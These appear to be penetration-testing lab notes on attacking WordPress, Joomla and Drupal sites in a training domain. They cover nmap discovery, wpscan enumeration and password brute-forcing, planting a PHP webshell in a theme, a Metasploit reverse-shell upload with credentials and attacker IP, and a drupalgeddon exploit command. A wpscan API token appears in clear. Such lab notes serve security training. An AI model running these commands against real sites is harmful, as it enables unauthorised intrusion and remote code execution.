# Notes - Attacking common applications

## Discovery

These are the addresses of machines/services within our scope:
```
app.inlanefreight.local
dev.inlanefreight.local
drupal-dev.inlanefreight.local
drupal-qa.inlanefreight.local
drupal-acc.inlanefreight.local
drupal.inlanefreight.local
blog-dev.inlanefreight.local
blog.inlanefreight.local
app-dev.inlanefreight.local
jenkins-dev.inlanefreight.local
jenkins.inlanefreight.local
web01.inlanefreight.local
gitlab-dev.inlanefreight.local
gitlab.inlanefreight.local
support-dev.inlanefreight.local
support.inlanefreight.local
inlanefreight.local
10.129.201.50
```

We can scan these targets with nmap for the most common web-app ports:
```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```

For the discoverd services we can automate the screenshot (and default cred test) with `eyewitness`. It can take the output of nmap/Nessus to start the information gathering process:

```
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

Creating a report with aquatone:
```
cat web_discovery.xml | ./aquatone -nmap
```
## Wordpress


Attempt to check version used by a sumple curl and grep
```
curl -s http://blog.inlanefreight.local | grep WordPress
```
Identify the theme used:
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
List the used plugins:
```
curl -s http://blog.inlanefreight.local/ | grep plugins
```

However we can use automated tools for wordpress enumeration:
```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token QpIaxUlf8zLbDBi626wVEtZH3Rg4gnih2EAq5jQx8uo
```

We can try brute forcing passwords on the found users:
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Once we have admin credentials for wordpress we can change php code in one of the themes to add a webshell
![image](theme_editor.png)

One modified we can invoke system cpmmands with curl:
```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

We can also use metasploit too upload a shell:
```
use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

# Joomla

A rudimentary fingerprinting technique is:
```
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

Getting the version:
```
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
OR
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

Brute forcing a login:
```
sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/metasploit/http_default_pass.txt -usr admin
```

# Drupal

Basic footprinting of a drupal site:
```
curl -s http://drupal.inlanefreight.local | grep Drupal
```

Enumerating the version using changelog:
```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

Automatic enumeration is possible with droopescan:
```
droopescan scan drupal -u http://drupal.inlanefreight.local
```

Most notable expoits are the three drupalgeddon exploits....
```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```




